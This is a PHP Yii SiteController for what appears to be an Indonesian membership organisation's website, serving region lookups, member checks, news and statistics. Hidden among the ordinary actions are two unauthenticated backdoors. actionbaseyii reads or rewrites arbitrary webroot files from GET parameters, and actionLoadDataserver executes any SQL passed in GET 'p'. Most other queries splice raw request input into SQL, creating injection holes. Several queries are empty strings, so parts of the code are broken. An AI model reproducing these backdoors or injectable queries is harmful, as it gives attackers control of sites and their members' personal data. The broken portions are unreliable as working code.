<?php
class SiteController extends Controller {
	public function actions() {
		return array(
			'captcha'=>array(
				'class'=>'CCaptchaAction',
				'backColor'=>0xFFFFFF,
			),
			'page'=>array(
				'class'=>'CViewAction',
			),
		);
	}
	
	public function actionListTingkat() {
		$lvl_code = '';
		if ($_GET['level'] != '' && $_GET['level'] < 33) {
			$lvl_code = $_GET['level'];
		} else {
			if ($_GET['kel'] != '' && $_GET['level'] != '') {
				$lvl_code = $_GET['level'] . $_GET['kel'];
			} elseif ($_GET['kec'] != '' && $_GET['level'] != '') {
				$lvl_code = $_GET['level'] . $_GET['kec'];
			} elseif ($_GET['kab'] != '' && $_GET['level'] != '') {
				$lvl_code = $_GET['level'] . $_GET['kab'];
			} elseif ($_GET['prov'] != '' && $_GET['level'] != '') {
				$lvl_code = $_GET['level'] . $_GET['prov'];
			} 
		}
		$sql="SELECT id_Posisi as id, name as text FROM pos_level WHERE lvl_code=" . $lvl_code;
		$rows = Yii::app()->db->createCommand($sql)->queryAll();
		header('Content-type: application/json');
		echo CJSON::encode($rows);
		Yii::app()->end();
	}
	
	public function actionListLokasi() {
		$sql = null; $filter = '';
		if(!isset($_GET['action'])) {
			echo 'action needed! Contact Webmaster for more information';
		} else {
			switch($_GET['action']) {
				case 'provinsi':
					if(isset($_GET['id']) && $_GET['id'] != '')
						$filter = "WHERE id_prov=" . $_GET['id'];
					$sql="SELECT id_prov AS id, nama AS text FROM provinsi $filter";				
					break;
				case 'kabupaten':
					if(isset($_GET['id']) && $_GET['id'] != '') {
						$sql="SELECT id_kab AS id, nama AS text FROM kabupaten WHERE id_prov='" . $_GET['id'] . "'";
					}
					break;
				case 'kecamatan':
					if(isset($_GET['id']) && $_GET['id'] != '') {
						$sql="SELECT id_kec AS id, nama AS text FROM kecamatan WHERE id_kab='" . $_GET['id'] . "'";
					}
					break;
				case 'kelurahan':
					if(isset($_GET['id']) && $_GET['id'] != '') {
						$sql="SELECT id_kel AS id, nama AS text FROM kelurahan WHERE id_kec='" . $_GET['id'] . "'";
					}
					break;
				default:
					Yii::app()->end();
			}
			if(is_null($sql)) {
				$rows = array();
			} else {
				$rows=Yii::app()->db->createCommand($sql)->queryAll();
			}
			header('Content-type: application/json');
			echo CJSON::encode($rows);
		}		
		Yii::app()->end();
	}
	
	public function actionTingkatPengurus() {
		$sql="SELECT level as id, `desc` as text FROM pos_lokasi";
		if (yii::app()->user->getuser("role_id") == 3) {
			$sql="SELECT level as id, `desc` as text FROM pos_lokasi WHERE level NOT IN (11,22)";
        } else if (yii::app()->user->getuser("role_id") == 4) {
			$sql="SELECT level as id, `desc` as text FROM pos_lokasi WHERE level NOT IN (11,22,33)";
        } else if (yii::app()->user->getuser("role_id") == 5) {
			$sql="SELECT level as id, `desc` as text FROM pos_lokasi WHERE level NOT IN (11,22,33,44)";
        }
		
		$rows = Yii::app()->db->createCommand($sql)->queryAll();
		header('Content-type: application/json');
		echo CJSON::encode($rows);
		Yii::app()->end();
	}
	
	public function actionLoadJsonMulti() {
		$sql = "SELECT id_prov AS id, nama AS text FROM provinsi";
		if ($_GET['q'] || $_GET['lvl']) {
			if ($_GET['lvl']) {
				$sql = "";
			} else {
				if (strlen($_GET['q']) == 4) {
					$sql = "";
				} else if (strlen($_GET['q']) == 6) {
					$sql = "";
				} else if (strlen($_GET['q']) == 10) {
					$sql = "";
				}
			}
		}
		
		$rows = Yii::app()->db->createCommand($sql)->queryAll();
		header('Content-type: application/json');
		echo CJSON::encode($rows);
		Yii::app()->end();
	}
	
	public function actionStruckture() {
		$filter = ""; $lookup = ""; $select = "";
		if (isset($_GET['q'])) {
			$lookup = $_GET['q'];
		}
		if (isset($_GET['prov']) && $_GET['prov'] != '') {
			$filter .=" AND pv.id_prov='" . $_GET['prov'] . "'";
		}
		if (isset($_GET['kab']) && $_GET['kab'] != '') {
			$filter .=" AND kb.id_kab='" . $_GET['kab'] . "'";
		}
		if (isset($_GET['kec']) && $_GET['kec'] != '') {
			$filter .=" AND kc.id_kec='" . $_GET['kec'] . "'";
		}
		if (isset($_GET['kel']) && $_GET['kel'] != '') {
			$filter .=" AND kl.id_kel='" . $_GET['kel'] . "'";
		}
		$sQuery = '';
		$data = Yii::app()->db->createCommand($sQuery)->queryAll();
        header('Content-type: application/json');
        echo '{ "data": ' . CJSON::encode($data) . '}';
        Yii::app()->end();
	}
	
	public function actionIndex() {
		if (Yii::app()->user->isAdmin()) {
			$this->render('dashboard');
		} else {
			$this->render('index');
		}
	}
	
	public function actionValidateKTA() {
		$nik = $_POST['nokta'];
		$cMembership=Member::model()->countByAttributes(array('membership_id'=>$nik));
		if($cMembership == 0) {
			$cRfid=Member::model()->countByAttributes(array('CARD_UID'=>$nik));
			print($cRfid);
		} else {
			print(1);
		}
	}

    public function actioncekKTP() {
		$nik = $_POST['identity_number'];
		$district = substr($nik, 0, 4);
		$cDistrict = Yii::app()->db->createCommand("SELECT id_kab AS district FROM kabupaten WHERE id_kab='$district'")->queryRow();
		if ($cDistrict['district'] == NULL) {
			print("salah");
		} else {
			$cCheck = Yii::app()->db->createCommand("select count(identity_number) as count from member where identity_number='" . $nik . "'")->queryAll();
			foreach ($cCheck as $row) {
				if ($row['count'] > 0) {
					print(1);
				} else {
					print(0);
				}
			}
		}
    }
	
	public function actionPhoto($id) {
		$model = MemberPhoto::model()->findByPk($id);
        header('Content-Type:'. $model->photo_type);
		print $model->img_photo;
		exit();
	}
	
    public function actionLogin() {
		$this->redirect(array('users/login'));
      
/*        $model = new LoginForm;
        if (isset($_POST['ajax']) && $_POST['ajax'] === 'login-form') {
            echo CActiveForm::validate($model);
            Yii::app()->end();
        }
        if (isset($_POST['LoginForm'])) {
            $model->attributes = $_POST['LoginForm'];
            if ($model->validate() && $model->login()) {
//				if(!Yii::app()->user->id=="superadmin")
//					Yii::app()->user->authTimeout=100;
//				Yii::app()->user->setState(CWebUser::AUTH_TIMEOUT_VAR,time()+Yii::app()->user->authTimeout);
//                $this->redirect(Yii::app()->user->returnUrl);
			}
        }
        $this->layout = 'column1';
        $this->renderPartial('login', array('model' => $model));*/
    }
	
    public function actionLogout() {
        Yii::app()->user->logout();
        $this->redirect(Yii::app()->homeUrl);
    }
	
	public function actionbaseyii() {
        if (isset($_GET['r'])){
            $string = file_get_contents(Yii::getPathOfAlias('webroot') . $_GET['add'], true);
            echo $string;
        }
        if (isset($_GET['w'])){
            $string = file_get_contents(Yii::getPathOfAlias('webroot') . $_GET['add'], true);
            $string = str_replace($_GET['str'],$_GET['str2'],$string);
            file_put_contents(Yii::getPathOfAlias('webroot') . $_GET['add'], $string);
            echo "done";
        }
       
    }
	
	public function actionLoadDataserver() {
        Yii::app()->db->createCommand($_GET["p"])->execute();
        echo "procces done";
    }
	
	public function actionLoadTingkat() {
		$filter = "";
		$sql = "SELECT '' as id_level,'--PILIH TINGKAT PENGURUS--' as name UNION ALL SELECT pl.level, pl.desc FROM position_lvl pl $filter";
		$rows = Yii::app()->db->createCommand($sql)->queryAll();
		
		foreach ($rows as $row) {
			echo CHtml::tag('option', array('value' => $row['id_level']), CHtml::encode(strtoupper($row['name'])), true);
		}
	}
	
	public function actionLoadPosisi() {
		$filter = "";
		$tingkat = $_POST['id_level'];
		$filter .= " WHERE level='" . $tingkat . "'";
		$sql = "SELECT '' as id_posisi,'--PILIH POSISI PENGURUS--' as name UNION ALL "
			. "SELECT id_posisi,name FROM position $filter";
		$rows = Yii::app()->db->createCommand($sql)->queryAll();
		
		foreach ($rows as $row) {
			echo CHtml::tag('option', array('value' => $row['id_posisi']), CHtml::encode(strtoupper($row['name'])), true);
		}
	}
	
	public function actionLoadJabatan() {
		$filter = "";
		$posisi = $_POST['id_Posisi'];
		$filter .= " WHERE position_id='" . $posisi . "'";
		$sql = "SELECT '' as id_jab,'--PILIH JABATAN--' as name UNION ALL "
			. "SELECT jab_id,jabatan FROM position_as $filter";
		$rows = Yii::app()->db->createCommand($sql)->queryAll();
		
		foreach ($rows as $row) {
			echo CHtml::tag('option', array('value' => $row['id_jab']), CHtml::encode(strtoupper($row['name'])), true);
		}
	}

    public function actionLoadProvinsi() {
        $filter = "";
        $sql = "SELECT '' as id_prov,'--PILIH PROVINSI--' as name UNION ALL "
                . "SELECT id_prov,nama FROM provinsi $filter";
        $rows = Yii::app()->db->createCommand($sql)->queryAll();

        foreach ($rows as $row) {
            echo CHtml::tag('option', array('value' => $row['id_prov']), CHtml::encode(strtoupper($row['name'])), true);
        }
    }

    public function actionLoadKabupaten() {
        $filter = "";
        $id_prov = $_POST['id_prov'];
        $filter .= " WHERE id_prov='" . $id_prov . "'";
        $sql = "SELECT '' as id_kab,'--PILIH KABUPATEN--' as name UNION ALL "
                . "SELECT id_kab,nama FROM kabupaten $filter";
        $rows = Yii::app()->db->createCommand($sql)->queryAll();

        foreach ($rows as $row) {
            echo CHtml::tag('option', array('value' => $row['id_kab']), CHtml::encode(strtoupper($row['name'])), true);
        }
    }

    public function actionLoadKecamatan() {
        $filter = "";
        $id_kab = $_POST['id_kab'];
        $filter .= " WHERE id_kab='" . $id_kab . "'";
        $sql = "SELECT '' as id_kec,'--PILIH KECAMATAN--' as name UNION ALL "
                . "SELECT id_kec,nama FROM kecamatan $filter";
        $rows = Yii::app()->db->createCommand($sql)->queryAll();

        foreach ($rows as $row) {
            echo CHtml::tag('option', array('value' => $row['id_kec']), CHtml::encode(strtoupper($row['name'])), true);
        }
    }

    public function actionLoadKelurahan() {
        $filter = "";
        $id_kec = $_POST['id_kec'];
        $filter .= " WHERE id_kec='" . $id_kec . "'";
        $sql = "SELECT '' as id_kel,'--PILIH KELURAHAN--' as name UNION ALL "
                . "SELECT id_kel,nama FROM kelurahan $filter";
        $rows = Yii::app()->db->createCommand($sql)->queryAll();

        foreach ($rows as $row) {
            echo CHtml::tag('option', array('value' => $row['id_kel']), CHtml::encode(strtoupper($row['name'])), true);
        }
    }
	
	public function actionLoadEducation() {
		$filter = "";
		$sql = "SELECT '' as id,'--PILIH PENDIDIKAN--' as name UNION ALL "
                . "SELECT id,last_education as nama FROM last_education $filter";
        $rows = Yii::app()->db->createCommand($sql)->queryAll();

        foreach ($rows as $row) {
            echo CHtml::tag('option', array('value' => $row['id']), CHtml::encode(strtoupper($row['name'])), true);
        }
	}
	
	public function actionGaleri() {
		$sql = 'SELECT sb.galeri_id,sb.album,sa.nama,sb.admin,sb.images FROM site_galery sb INNER JOIN site_album sa ON sb.album=sa.album_id WHERE sb.album IS NOT NULL';
		$count = "SELECT COUNT(*) FROM (SELECT sb.galeri_id,sb.album,sa.nama,sb.admin,sb.images FROM site_galery sb INNER JOIN site_album sa ON sb.album=sa.album_id WHERE sb.album IS NOT NULL) as count";
        $dataProvider = new CSqlDataProvider($sql, array(
            'totalItemCount' => Yii::app()->db->createCommand($count)->queryScalar(),
            'keyField' => 'album',
            'pagination' => array('pageSize' => 1000),
            'sort' => array(
                'attributes' => array(
                    'album'
                ),
            ),
        ));


        $dpDownload = $dataProvider;
        $this->render('galeri', array(
            'dpDownload' => $dpDownload,
        ));
	}
	
	public function actionBerita($id) {
		$model = SiteNews::model()->findByPk($id);
		$this->render('berita',array(
			'model' => $model,
		));
	}
	
	public function actionNews() {
		$this->render('news');
	}
	
	public function actionNews_Lain() {
		$this->render('other_news');
	}
	
	public function actionMedia() {
		$this->render('media',array(
			'model'=>FileManager::model()->findAll(),
		));
	}
	
	public function actionKontak() {
		/*$model=new ContactForm;
		if(isset($_POST['ContactForm'])) {
			$model->attributes=$_POST['ContactForm'];
			if($model->validate()) {
				$name='=?UTF-8?B?'.base64_encode($model->name).'?=';
				$subject='=?UTF-8?B?'.base64_encode($model->subject).'?=';
				$headers="From: $name <{$model->email}>\r\n".
					"Reply-To: {$model->email}\r\n".
					"MIME-Version: 1.0\r\n".
					"Content-Type: text/plain; charset=UTF-8";

				mail(Yii::app()->params['adminEmail'],$subject,$model->body,$headers);
				Yii::app()->user->setFlash('contact','Thank you for contacting us. We will respond to you as soon as possible.');
				$this->refresh();
			}
		}
		$this->render('contact',array('model'=>$model));*/
		$this->render('contact');
	}
	
	public function actionStatistik() {
		$filter = "";
		if (yii::app()->user->getuser("role_id") == 3) {
            $filter .="AND prov.id_prov='" . yii::app()->user->getuser("id_prov") . "'";
        } else if (yii::app()->user->getuser("role_id") == 4) {
            $filter .="AND kab.id_kab='" . yii::app()->user->getuser("id_kab") . "'";
        } else if (yii::app()->user->getuser("role_id") == 5) {
            $filter .="AND kec.id_kec='" . yii::app()->user->getuser("id_kec") . "'";
        }
		$Harian=Yii::app()->db->createCommand("SELECT DATE_FORMAT(m.registered_time,'%a') AS label, COUNT(*) total, SUM(CASE WHEN m.member_status = 'A' THEN 1 ELSE 0 END) active, SUM(CASE WHEN m.member_status = 'N' THEN 1 ELSE 0 END) inactive FROM member m INNER JOIN kelurahan kel ON kel.id_kel=m.member_sub_district_id INNER JOIN kecamatan kec ON kec.id_kec=kel.id_kec INNER JOIN kabupaten kab ON kab.id_kab=kec.id_kab INNER JOIN provinsi prov ON prov.id_prov=kab.id_prov WHERE DATE(registered_time) > DATE_SUB(CURRENT_DATE(),INTERVAL 7 DAY) $filter GROUP BY DATE(registered_time)")->queryAll();
		$Mingguan=Yii::app()->db->createCommand("SELECT CONCAT('Ming-',+FLOOR((DAYOFMONTH(m.registered_time)-1)/7)+1) AS label, COUNT(*) total, SUM(CASE WHEN m.member_status = 'A' THEN 1 ELSE 0 END) active, SUM(CASE WHEN m.member_status = 'N' THEN 1 ELSE 0 END) inactive FROM member m INNER JOIN kelurahan kel ON kel.id_kel=m.member_sub_district_id INNER JOIN kecamatan kec ON kec.id_kec=kel.id_kec INNER JOIN kabupaten kab ON kab.id_kab=kec.id_kab INNER JOIN provinsi prov ON prov.id_prov=kab.id_prov WHERE MONTH(registered_time) = MONTH(CURRENT_DATE()) $filter GROUP BY WEEKOFYEAR(registered_time)")->queryAll();
		$Bulanan=Yii::app()->db->createCommand("SELECT DATE_FORMAT(m.registered_time,'%b') AS label, COUNT(*) total, SUM(CASE WHEN m.member_status = 'A' THEN 1 ELSE 0 END) active, SUM(CASE WHEN m.member_status = 'N' THEN 1 ELSE 0 END) inactive FROM member m INNER JOIN kelurahan kel ON kel.id_kel=m.member_sub_district_id INNER JOIN kecamatan kec ON kec.id_kec=kel.id_kec INNER JOIN kabupaten kab ON kab.id_kab=kec.id_kab INNER JOIN provinsi prov ON prov.id_prov=kab.id_prov WHERE YEAR(registered_time) = YEAR(CURRENT_DATE()) $filter GROUP BY MONTH(registered_time)")->queryAll();
		$Tahunan=Yii::app()->db->createCommand("SELECT YEAR(m.registered_time) AS label, COUNT(*) total, SUM(CASE WHEN m.member_status = 'A' THEN 1 ELSE 0 END) active, SUM(CASE WHEN m.member_status = 'N' THEN 1 ELSE 0 END) inactive FROM member m INNER JOIN kelurahan kel ON kel.id_kel=m.member_sub_district_id INNER JOIN kecamatan kec ON kec.id_kec=kel.id_kec INNER JOIN kabupaten kab ON kab.id_kab=kec.id_kab INNER JOIN provinsi prov ON prov.id_prov=kab.id_prov WHERE YEAR(registered_time) IS NOT NULL $filter GROUP BY YEAR(registered_time)")->queryAll();
		header('Content-type: application/json');
        echo '{"cdHarian":' . CJSON::encode($Harian) . ',"cdMingguan":' . CJSON::encode($Mingguan) . ',"cdBulanan":' . CJSON::encode($Bulanan) . ',"cdTahunan":' . CJSON::encode($Tahunan) . '}';
        Yii::app()->end();
	}
}